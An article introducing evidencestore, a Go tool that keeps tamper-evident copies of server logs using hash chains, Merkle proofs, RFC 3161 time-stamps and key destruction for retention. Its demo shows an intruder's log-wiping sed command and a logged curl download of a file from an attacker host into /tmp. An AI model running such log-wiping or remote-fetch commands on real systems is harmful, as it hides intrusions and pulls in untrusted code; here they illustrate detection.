# The intruder deleted four lines. The store kept them.

_October 2026 · [Русская версия](ARTICLE.ru.md)_

On a test web server called web-1, `/var/log/auth.log` shows a quiet morning:

```
Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 port 51234 ssh2: ED25519 SHA256:k3Vq1rQ8
Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
```

A few seconds earlier the file had six lines. The other four said that someone at 203.0.113.7 got the root password on the third try and downloaded a file into `/tmp`. Then that someone ran one command:

```sh
sed -i '/203.0.113.7/d' /var/log/auth.log
```

and the four lines were gone. `grep 203.0.113.7` on web-1 finds nothing.

But a collector running next to the log had already sent every line to a store on another machine. This is what the investigation gets back from it, every record checked offline by a separate tool (long lines 1, 2, 7 and 8 shortened):

```
 seq  proof         on web-1 now   line
   1  VERIFIED      yes            Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 ...
   2  VERIFIED      yes            Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; ...
   3  VERIFIED      DELETED        Oct 24 05:53:51 web-1 sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2
   4  VERIFIED      DELETED        Oct 24 05:53:52 web-1 sshd[1188]: Failed password for root from 203.0.113.7 port 40112 ssh2
   5  VERIFIED      DELETED        Oct 24 05:53:53 web-1 sshd[1188]: Accepted password for root from 203.0.113.7 port 40112 ssh2
   6  VERIFIED      DELETED        Oct 24 05:53:54 web-1 sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.x http://203.0.113.7/x
   7  VERIFIED      yes (again)    Oct 24 05:53:49 web-1 sshd[1021]: Accepted publickey for deploy from 10.0.0.5 ...
   8  VERIFIED      yes (again)    Oct 24 05:53:49 web-1 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; ...
```

The deleted lines are all there, byte for byte. Each one comes with a proof that the store received it between two time-stamps signed by an outside authority, and that it was in the store before the file was rewritten. To check a proof you need the proof bundle, the store's public key and the certificates of the time-stamping authority. You don't need access to the store, and you don't have to trust whoever runs it.

This is evidencestore, a store for logs that may one day have to hold up as evidence. The code is written in Go together with an AI assistant, Claude Code, and licensed under Apache 2.0. The demo above is one script, `scripts/demo-intruder.sh`. What follows is the idea and the design: the path of one line, and what ends up proven and what doesn't.

## Contents

- [The idea](#the-idea)
- [The demo, step by step](#the-demo-step-by-step)
- [How it works](#how-it-works)
- [Deleting on schedule](#deleting-on-schedule)
- [Logs of AI agents](#logs-of-ai-agents)
- [What it can't do](#what-it-cant-do)
- [How it was tested](#how-it-was-tested)
- [Try it](#try-it)

## The idea

I'm an anesthesiologist, and medicine has a rule that fits this problem well. A patient's chart is a legal document, and nothing in it is ever erased. A wrong entry gets a single line through it so it can still be read, the correction goes next to it, with a date and a signature. A log file on a server is the opposite: it's a text file, and whoever has root can change it without a trace.

A log is written by the system it describes and usually lies on the same machine. Whoever controls the machine controls the log. Cleaning logs after a break-in is common enough to have a number in MITRE ATT&CK, T1070.002. An administrator who made a mistake, or an AI agent that did something it shouldn't have, often has the same access.

The usual answers cover part of the problem. Forwarding logs to another machine (rsyslog, a SIEM) beats the intruder, but then the copy is trusted only because the people who run that machine are trusted, and an outsider has nothing to check. journald's Forward Secure Sealing detects changes to sealed parts of the journal, but deleting the files is still possible, and entries after the last seal aren't protected yet. Immutable databases such as immudb prove that they themselves weren't altered; they aren't witnesses for the logs of other systems.

What I wanted:

1. A line that reached the store can't disappear or change without that showing.
2. Someone who doesn't trust the operator can check it themselves, offline, with a small tool and a couple of public keys.
3. Time comes from outside. The store's own clock is not evidence.
4. Old records can be deleted on schedule without breaking the proofs of the records that remain.
5. A line lost on the way shows up as a gap, not as silence.

That gives the design. A collector next to the source numbers the lines and sends them to a store on another machine. The store encrypts each record with its own key, writes it to disk and puts its digest into a hash chain with Merkle trees. An outside RFC 3161 time-stamping authority, such as the National Certification Authority of Kazakhstan, regularly time-stamps the chain head. For any record the store produces a proof bundle, and the auditor checks it on their own machine without access to the store. Deletion on schedule works by destroying keys: the body can no longer be read, while the proof of existence and integrity stays.

None of the pieces are new: hash chains, Merkle trees, the signed promises of Certificate Transparency (RFC 6962), RFC 3161 time-stamps. Russ Cox's [Transparent Logs for Skeptical Clients](https://research.swtch.com/tlog) is a good introduction to the family. evidencestore puts them together for one job: other systems' logs.

## The demo, step by step

You need Go 1.25.4 or newer, and python3, which the script uses to print the table. Nothing on your machine is touched, because "web-1" is just a directory inside a temporary folder.

```sh
git clone https://github.com/Nikolay1994Kaz/evidencestore
cd evidencestore
scripts/demo-intruder.sh
```

The script builds the three programs, makes demo certificates and starts the store on 127.0.0.1. The collector follows web-1's `auth.log` the way it would follow `/var/log/auth.log`. The script writes the morning, then the intrusion, one line per second, then the cleanup with `sed`, and along the way asks the store for a time-stamp four times: before the first line, after the morning, after the intrusion and at the end. Then it asks the store for a proof bundle for every record number of web-1, checks each bundle offline with `esverify` and saves each body with `esverify -body`. That's the table at the top. Last, it asks for the whole session of web-1 in one bundle over a window of time, and the four deleted lines are in it too; such bundles are newer than release v0.2.0.

Under the table the script prints when each deleted record arrived:

```
record 3: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 4: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 5: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
record 6: deleted on web-1; the store received it between 05:53:50 UTC and 05:53:54 UTC (TSA time-stamps)
records 7-8: sed -i wrote a new auth.log, and the collector read it too: the store got these lines again at 05:53:54 UTC (TSA time-stamps, to the second), which is when the file was rewritten
the deleted lines were in the store before the file was rewritten: the time-stamp that covers them lies in the chain before the rewritten file's lines
```

Records 7 and 8 exist because `sed -i` doesn't edit a file in place. It writes a new file and renames it over the old one, so for the collector this is a new file at the same path, read from the beginning. The time-stamp that covers the deleted lines lies in the chain before the lines of the rewritten file, so the bundles themselves show the order of events: first the store had the intruder's lines, then the file was replaced.

The full report for record 5, the successful login:

```
$ esverify -proof 5.json -store-key Nor+T4/XRGkTAc9QDvBmTTgnF+a/cjxbPkjE8Bhz/MU -tsa-trust tsa-root.crt -body 5.restored
VERIFIED

Record: source web-1, number 5, type "syslog"
Received by the store: 2026-10-24 05:53:53 UTC (by its clock)
Digest: 769b6e9208678938fa826abc96b90c48962a3263425f38073ab0cecc97d3ea55
Entered the chain between T1 = 2026-10-24 05:53:50 UTC and T2 = 2026-10-24 05:53:54 UTC (TSA time-stamps)

Checks:
  ✔ the record parses
  ✔ the chain leaf describes this very record — position 5
  ✔ the links are chained by hash with no gaps — 6 links
  ✔ the head is signed with the store key — head 9
  ✔ the record is in a chain link (Merkle path) — link 8
  ✔ a TSA time-stamp over the chain after the record (not later than T2) — T2 = 2026-10-24 05:53:54 UTC, head 9
  ✔ a TSA time-stamp in the chain before the record (not earlier than T1) — T1 = 2026-10-24 05:53:50 UTC
  ✔ the receive time lies between the TSA time-stamps — 2026-10-24 05:53:53 UTC
  ✔ the body opens with the record key in the bundle, the key is bound to the digest, the GCM tag matches — 93 bytes

Body:
Oct 24 05:53:53 web-1 sshd[1188]: Accepted password for root from 203.0.113.7 port 40112 ssh2

What this bundle does not prove:
  — the store's signature proves that THIS store signed the head; only a TSA time-stamp stands against its owner rewriting the whole chain
  — what is proven is that these bytes came from the source and have not changed, not that their content is true

VERIFIED
body written to 5.restored (93 bytes)
```

Each line under "Checks" is a separate step. If any of them fails, the verdict becomes NOT VERIFIED and the exit code 1. The block "What this bundle does not prove" is always printed. What stands behind each check is explained below.

The other demo, `scripts/demo.sh`, uses a made-up core banking log. It changes one byte of a bundle (`esverify` catches the forgery) and destroys a month key. Both demos can take real time-stamps: `DEMO_TSA=digicert` from DigiCert's public service, `DEMO_TSA=nca` from the National Certification Authority of Kazakhstan.

## How it works

There are three programs. The collector, `escollect`, runs next to the log. The store, `evidencestore`, runs on its own machine, preferably under other administrators than the source. The auditor's tool, `esverify`, runs anywhere, macOS and Windows included, and never talks to the store.

```
 web-1                                         store host
 ┌───────────────────────┐                    ┌──────────────────────────────────────┐
 │ /var/log/auth.log     │                    │ evidencestore serve                  │
 │          │            │                    │                                      │
 │          ▼            │  HTTPS, TLS 1.3,   │  1. source = name in the certificate │
 │ escollect             │  client certificate│  2. same number seen before?         │
 │  number each line     │ ─────────────────▶ │  3. receive time (TSA window)        │
 │  keep it in a buffer  │                    │  4. encrypt with a per-record key    │
 │  on disk, send        │                    │  5. evidence log, fsync              │
 │  in batches           │ ◀───────────────── │  6. leaf into the hash chain         │
 │  keep the promises    │   signed promise   │  7. sign the promise, answer         │
 └───────────────────────┘                    │                                      │
                                              │  in the background: a chain link     │
                                              │  every second, TSA time-stamps over  │
                                              │  the chain head, keys of the months  │
                                              └──────────────────┬───────────────────┘
                                                                 │ proof bundle (JSON file)
                                                                 ▼
                                              auditor's machine: esverify, offline
```

### The collector

`escollect` follows a log file the way `tail -F` does. It gives each line a sequence number (per source, never reset) and writes the line into its own buffer on disk before sending anything. The buffer is a small write-ahead log: each record in it holds the line, its number and the position in the file where the line came from. If the collector is killed halfway, it picks up from the buffer, and no line gets a second number or goes missing.

Lines go to the store in batches over HTTPS with TLS 1.3 and a client certificate. The name in the certificate is the name of the source. The store takes it from the certificate, never from the request body, so a collector can't write in another source's name.

For every record the store answers with a signed promise: "I received record 5 from web-1 with this digest at this time, and I will put it into the chain no later than this deadline" (one minute by default). The collector checks the signature against the store's public key, pinned in its config at install time, and only then counts the record as delivered. A bad promise is saved to `promises-rejected.jsonl` as evidence against the store itself, and the records stay in the buffer. It's the signed timestamp of Certificate Transparency: whoever holds the promise can later catch the store breaking its word.

Most of the collector's code is about files. logrotate renames `auth.log` to `auth.log.1` and creates a new one, while the application keeps writing into the old file until it gets a HUP. Some setups use `copytruncate`. Pipelock writes every shard into a new file with a random name. The kernel gives the inode number of a deleted file to the next new one. So the collector keeps a registry of files by inode, the way Filebeat does: each file has its own read position, first line and birth time (statx). A file that moves away from the log path is read through its open descriptor until it has been quiet for 10 seconds, and only then closed. After a restart a rotated file is found by its inode and birth time, under whatever name it has now.

If the collector loses something it can no longer read (a file truncated in place, a rotated file compressed while the collector was stopped), it skips one sequence number on purpose. The store sees the hole in the numbering and writes a gap event into its chain. The loss becomes visible.

A number alone guarantees nothing. Say the collector's virtual machine is restored from last week's snapshot. The buffer goes back in time, the store doesn't, and new lines get numbers the store has already used for other lines. If the store simply answered "duplicate" to a known number, the new lines would silently vanish. So at start the collector checks its count against the store and stops if the store remembers numbers it never handed out. And on every resend the store opens the stored body and compares it with the new one. The same body is an honest retry: the answer is "duplicate" with the same promise as the first time. A different body refuses the whole batch with 409 and leaves a conflict event in the chain. The whole batch, so that records of two collectors sharing one certificate don't get mixed together.

### Intake

Everything the store does before it answers "accepted" is in one function, `Ingest` in [`internal/store/ingest.go`](../internal/store/ingest.go):

1. A resent number is checked against the stored body, as above.
2. The receive time is the host clock, held inside a window derived from the last TSA time-stamp (details below).
3. The body is encrypted with a fresh key that exists for this one record (the DEK). The DEK is wrapped by the key of this source for this month (the KEK) and stored next to the ciphertext. The header (source, number, time, type) stays readable.
4. The sealed record goes into the evidence log, and the batch is fsynced. While one batch is being fsynced the next one collects, so there's no artificial delay. After the first failed write or fsync the log refuses everything: after a failed fsync on Linux you no longer know what is on disk.
5. A leaf goes into the hash chain: source, number, receive time, position in the log, the digest of the sealed record and the hash of the previous leaf of the same source.
6. The promise is signed and the answer goes out.

The answer doesn't wait for a chain link; links are written once a second in the background. That's what the deadline in the promise is for. If the record isn't in the chain by then, the promise in the collector's hands proves the breach.

After a crash the tail of the log may be torn, and it has to be cut off. But one flipped bit must not erase the accepted records that follow it. So a tail counts as torn only if no complete frame with a valid checksum follows the bad one. Otherwise it's disk corruption, and the store refuses to start. Bytes that are cut off are never deleted; they go into a file next to the segment. The chain files work the same way. And if the chain knows a record that the log doesn't have, the start fails too: an accepted record can't disappear quietly.

### Record format

On disk a record has a fixed binary layout:

```
version(1) | seq(8) | received_at(8) | len(4)+source | len(4)+content_type | len(4)+envelope
```

A hash of these bytes goes into the chain, so one record must always give the same bytes. JSON doesn't promise that (field order, whitespace, escaping), and neither does protobuf. Here the fields come in a fixed order, numbers are big-endian, strings carry a length prefix, and extra bytes at the end are an error. The digest is taken over the bytes on disk, that is, over the ciphertext: once the key is destroyed the body can't be read, and the digest still matches.

The body lives in an envelope:

```
"EV2" | kekID(16) | commit(32) | wrapNonce(12) | wrappedDEK(48) | dataNonce(12) | ciphertext+tag
```

`commit` is SHA-256 over a domain string, the month key's id and the record key. It's there because of a property of AES-GCM known as "invisible salamanders": GCM doesn't commit to its key. Whoever prepares a ciphertext can make it decrypt to two different plaintexts under two different keys, with a valid authentication tag both times. Without `commit`, a dishonest store could hand two auditors two different record keys and show them two different bodies under one digest. With it, a key that doesn't match the commitment inside the digest doesn't open the body.

### The chain

Every accepted record becomes a leaf. Once a second the store builds a Merkle tree over the new leaves and writes a link: the root of the tree, the number of the link and the hash of the previous link. The newest link is the head, and the store signs it with its Ed25519 key.

Change one byte of an old record and its digest changes, then its leaf, the Merkle root and the hash of the link, and every link after it breaks. To check one record you don't need the whole chain: the record, its path through the Merkle tree (a handful of hashes) and the links from its own link up to a signed head are enough.

Two classic holes are closed up front. Fields joined with a separator are ambiguous: scope `a|b` with id `c` hashes the same as scope `a` with id `b|c`. So every field is encoded with a length prefix. And a hash chain stays perfectly valid if you cut off its end, because each link only points back. That's why the head (its number and hash) is stored separately from the chain file, and a shortened file no longer matches it. At start the store also recomputes the Merkle root of every link from its leaves, so even a leaf swapped together with its frame checksum shows up.

There's a limit to say out loud. Whoever owns all of the store's files can rewrite everything: drop the last day, recompute every hash and sign a new head with the store's own key. The result is perfectly consistent, because a signature only proves that this store signed the head. Against the owner of the store you need a witness from outside.

### Time

That witness is a time-stamping authority (TSA), RFC 3161. You send it a hash and get back a token that says "this hash existed at this time", signed with the authority's certificate. Anyone can check the token against the authority's root certificate. The National Certification Authority of Kazakhstan runs one at `tsp.pki.gov.kz`, and it answers without an account. DigiCert runs a public one, and for offline demos the store has a fake one built in.

The store asks for a time-stamp over its chain head every 10 minutes when something new has entered the chain, and at least once an hour when nothing has. The token itself goes into the chain as a leaf. That gives every record two bounds:

- T1 is the last time-stamp before the record. Its token is in the chain before the record, so the record entered the chain after T1.
- T2 is the first time-stamp over a head that already contains the record. So the record existed no later than T2.

From then on history can't be rewritten without traces. A rewritten chain no longer matches the hashes the authority signed, so it can carry only fresh time-stamps, and the collectors hold signed promises for the original records. But the traces help only if someone checks them: the store doesn't compare promises or heads by itself. Root on the store host can still delete files.

The RFC 3161 code uses only the Go standard library, about 650 lines, with full offline verification of the CMS signature up to the root. The check is strict: one of the tests flips one bit in each of the 2,275 bytes of a real token from the National Certification Authority of Kazakhstan and expects the check to fail all 2,275 times.

The receive time is a separate problem. The store sets it from its own clock, and `esverify` checks that it lies between T1 and T2, with a minute of slack below and a second above. If the host clock is off, honest records fail verification forever. If someone sets it on purpose, records get dates that look real.

So the receive time is tied to the last time-stamp. After each time-stamp the store knows the authority's time, and it measures the time since then with the monotonic clock, which doesn't jump when somebody changes the date. The monotonic clock can drift, so the store allows 100 ppm either way, plus the time the authority took to answer, plus one second of rounding, because tokens carry whole seconds. That gives a window in which the real time must be right now:

```
T  = time in the last TSA token
e  = monotonic time since that token arrived
d  = how long the TSA took to answer

lo = T + e - e*100ppm                    the real time is not earlier than this
hi = T + 1s + (e + d) + (e + d)*100ppm   and not later than this

receive time = host clock, clamped into [hi - 55s, lo]
```

The receive time is the host clock, but never outside the window. If the host clock runs outside it, the store raises an alarm in its log and a metric, and the times stay honest anyway. The window grows wider than 55 seconds after about three days without a fresh time-stamp (sooner if the authority answers slowly). Then the store stops accepting records with HTTP 503 until a new stamp narrows it, and the collectors keep their lines in the buffer meanwhile. The price is plain: an authority that's unreachable for three days stops intake.

### The proof bundle

For an auditor, the operator exports a bundle for one record:

```sh
evidencestore proof -config /etc/evidencestore/evidencestore.json -source web-1 -seq 5 -dek -out 5.json
```

The bundle holds the sealed record exactly as it lies on disk, its leaf and Merkle path, the links from the one T1 time-stamps (it comes before the record's own link) up to the head under T2, signed by the store, the T1 and T2 tokens and, with `-dek`, the key of this one record, so the auditor can read the body without getting the month key.

Besides the bundle, `esverify` needs the store's public key (printed by `evidencestore init`; the collectors pin the same key), the TSA certificates (the root, and the intermediate when the token does not carry it: for the NCA, `root_rsa_2020.cer` and `nca_rsa_2022.cer`) and, optionally, the collector's promise for that record. The checks in the report above go in order. The record parses. The leaf in the chain names exactly these bytes. The links are chained by hash and end in a head signed by the pinned key. The Merkle path leads from the leaf to its link. The T2 token is valid and sits over a head at or after the record's link, and the T1 token is valid and lies in the chain before it. The receive time lies between them. The record key opens the body and matches the commitment, and the GCM tag is correct. With `-promise`, the promise is checked too: signed by the same key, naming the same record, with the record in the chain before its deadline.

A bundle without T2 is refused unless you pass `-allow-no-tsa`. Without a time-stamp after the record, the bundle carries only the store's own word, and whoever holds the signing key can make up a record with any date. The verdict is printed first and last, and control characters in the body are escaped; otherwise a log line with an ESC sequence ("clear the screen, print VERIFIED") would paint a false verdict on the auditor's screen. The exit code is 0 for verified, 1 for not verified and 2 for bad usage. `-body FILE` writes the body out byte for byte, but only when the bundle verified, so the original log can be rebuilt from the store.

## Deleting on schedule

Logs can't be kept forever: there are retention rules, privacy laws and disk sizes. But deleting a record from a hash chain breaks the chain. The known way out is crypto-erasure. Every record is encrypted, and when its time comes, the key is destroyed. The bytes stay where they are and the chain stays intact, but the body can no longer be read. NIST SP 800-88 accepts this as a way to sanitize data, on one condition: every copy of the key is destroyed.

The keys come in layers:

```
root key             in roots_dir (later an HSM or KMS); wraps only the file key
 └ file key          32 bytes, new on every write of keyring.dat
    └ month key      one per source per month (KEK)
       └ record key  one per record (DEK), stored wrapped next to the body
```

Deleting "web-1, October 2026" means destroying one month key. The hard part is the copies. `keyring.dat` is backed up after every change (losing it means losing every body), and backups live longer than anyone remembers. So destroying a key also rotates the root: the new `keyring.dat`, without the destroyed key, is locked under a new root key, and the old root key is destroyed. Every old copy of `keyring.dat`, in backups, disk snapshots and old SSD blocks, becomes unreadable at once. The same property means the backup can be copied freely, since without the root it's useless.

Only the 32-byte file key ever passes through the root key, so the root can move into an HSM or a cloud KMS (AWS KMS encrypts at most 4 KB per call). Roots can be mirrored to a second disk or machine, and a destruction is final only when both copies are gone.

A month key goes through four states, loosely following NIST SP 800-57:

```
active ──deactivate──▶ deactivated ──schedule──▶ pending ──complete──▶ destroyed
                            ▲                       │
                            └─────────cancel────────┘
```

The current month is active and seals new records; past months only decrypt. A destruction request needs two different approvers and a waiting period (seven days by default, at least an hour outside a demo), and it can be cancelled while it waits. The waiting period starts at a TSA time-stamp taken with the request and ends by the earlier of the store clock and a fresh TSA time-stamp, so moving the host clock doesn't shorten it. The store never starts a destruction on its own: `keys due` only shows which months are past retention. A request that has waited out its period the store completes by itself within a minute, or at once on `keys complete`.

From `scripts/demo.sh`, with one approver:

```
error: 409 Conflict: keyring: approvals rejected: schedule-destroy needs 2 distinct approvers
```

After the second approver, the wait and `keys complete`, a bundle for the same record still verifies, without the body:

```
VERIFIED

Record: source abs-core, number 2, type "syslog"
...
What this bundle does not prove:
  — body not opened: the bundle carries no record key, or the month key was destroyed (retention)
```

You can still prove that record 2 from `abs-core` existed, came from that source, was received at that time and was never changed. You just can't read it.

Two caveats. "Two approvers" is bookkeeping, not enforcement: the store sees two different names but can't know who is behind them, and root on its machine can get around the rule. Real dual control is an HSM with a quorum. And a record key once handed to an auditor in a bundle stays with the auditor: an old bundle with its key still opens the body after the month key is destroyed.

## Logs of AI agents

The store was first meant for the actions of AI agents. An agent's own log is a poor witness. In July 2025 the Replit AI agent deleted a production database during a code freeze and then told its user that a rollback was impossible; the rollback worked. A better witness sits in front of the agent: a gateway that every request goes through. Pipelock keeps a flight recorder in which each JSONL entry is hash-chained to the previous one and checkpoints are signed with the gateway's Ed25519 key.

evidencestore has a source type for such journals. At intake the store recomputes the hash of each entry the way Pipelock does (checked byte for byte against Pipelock v3.6.0 output), checks the chain of each writer and verifies checkpoint signatures with the gateway key pinned in its config. Nothing is rejected: the entry is stored as received, and a verdict goes into the chain next to it. The gateway's chain fields stay readable even after the month key is destroyed. The part of the bundle that checks the gateway's chain is mandatory; without it a damaged entry would look intact.

We tried a scenario that Pipelock's documentation lists as an open limit: deleting a whole run. The gateway ran twice, the second run linked to the first by a chain-link file, and the collector picked up the shards. Then the first run's shards and its chain-link were deleted. Pipelock's verifier said `RESTART CONTINUITY OK` on what was left, exit code 0: from the inside the deletion was invisible. From the store both runs came back byte for byte, and the same verifier said `CHAIN VALID` for each. The store narrows this gap rather than closing it: only what was written within the last `flush_every` before the deletion can still disappear unnoticed. The chain-link files aren't collected yet, so restored runs show up as unlinked.

The Pipelock-specific code is 665 lines out of about 17.5 thousand. Everything else is the same for any log, which is why the first demo is an `auth.log`.

## What it can't do

- Lines destroyed before the collector reads them are not in the store. By default the collector reads every second. A file created and deleted between two reads isn't seen either.
- A short stop of the collector goes unseen. When there's nothing new, the collector sends a heartbeat every 30 seconds, and after two minutes without one the store writes "collector lost" into the chain. A shorter stop leaves no mark, and root on the source host can fake the heartbeat with the collector's own certificate.
- The store keeps what the source wrote. It doesn't make a line true: if the application lies, the lie is stored faithfully.
- Root on the store host can delete or rewrite the store's files. Time-stamps, the collectors' promises and the remote copy make that detectable, but only for someone who checks them, and nothing can prevent it. Keep the store on its own machine with its own administrators, and its remote copy (S3 or a directory, chunks that are never deleted) on yet another one. With one administrator for everything, only the time-stamps and a witness that administrator does not control stand against them: signed chain heads kept out of their reach (`witness.url`, checked with `esverify -heads`; see the README).
- The cryptography isn't certified: AES-256-GCM and Ed25519 from the Go standard library, root keys in files. The root sits behind an interface so that an HSM can be plugged in.
- The collector reads files only. There's no syslog receiver.

The full list is in the README under [Known limitations](../README.md#known-limitations).

## How it was tested

The numbers are for commit `957345c`, 12 October 2026; the mutation count is for 27 October.

GitHub Actions runs the tests (`go build ./... && go vet ./... && go test -race ./...`) on every push to master and every pull request. On top of that there's mutation testing: [`scripts/mutate.py`](../scripts/mutate.py) injects deliberate bugs into the code one at a time (flip a comparison, skip a check) and expects some test to fail. All 557 were caught.

The collector, the clock and the store itself are also checked by simulations against an oracle: random scenarios in virtual time with crashes in the middle of disk writes, three kinds of rotation, lost answers, wrong clocks and a disappearing TSA. The oracle demands that every line arrives exactly once, every loss shows up as a gap and every promise is kept. The store went through 2,000 scenarios of 300 steps without a failure, with 36,038 crashes, 6,649 restores from the copy, 1,368 disks that lied about fsync and 2,185 destroyed keys along the way.

And a night on real logs: for nine hours the store took in my machine's `syslog`, `auth.log` and `kern.log` and the flight recorder of a live Pipelock. Meanwhile logrotate rotated the logs at midnight, the store was restarted five times, Pipelock twice, and one collector was killed with `kill -9`. All 104,738 records matched their sources, in order, with no duplicates and no losses, and a sample of 7,560 bundles verified.

More detail is in the README (How it was tested), and the bugs found during review are in [`docs/FINDINGS.md`](FINDINGS.md) (in Russian).

## Try it

```sh
git clone https://github.com/Nikolay1994Kaz/evidencestore
cd evidencestore
scripts/demo-intruder.sh                     # the auth.log story from the top of this article
scripts/demo.sh                              # a one-byte forgery and a key destruction
DEMO_TSA=digicert scripts/demo-intruder.sh   # real time-stamps from DigiCert (needs internet)
go build ./... && go vet ./... && go test -race ./...
```

Release binaries are on the [Releases](https://github.com/Nikolay1994Kaz/evidencestore/releases) page: the store and the collector for Linux, and `esverify` also for macOS and Windows, with `SHA256SUMS` and build attestations. The latest release is v0.2.0: it has the intruder demo, `esverify -body` and the witness of chain heads. Bundles over a window of time came after it and will be in the next release.

Further reading: the [README](../README.md) (configuration, installation, limits), and in Russian [`docs/ARCHITECTURE.md`](ARCHITECTURE.md) (a code map with the order to read it in) and [`docs/DECISIONS.md`](DECISIONS.md) (design decisions).

Nobody runs this in production yet: there hasn't been a pilot, and the cryptography isn't certified. If your logs may one day have to stand up in front of an auditor or a court, or you see a hole I missed, please open an issue.
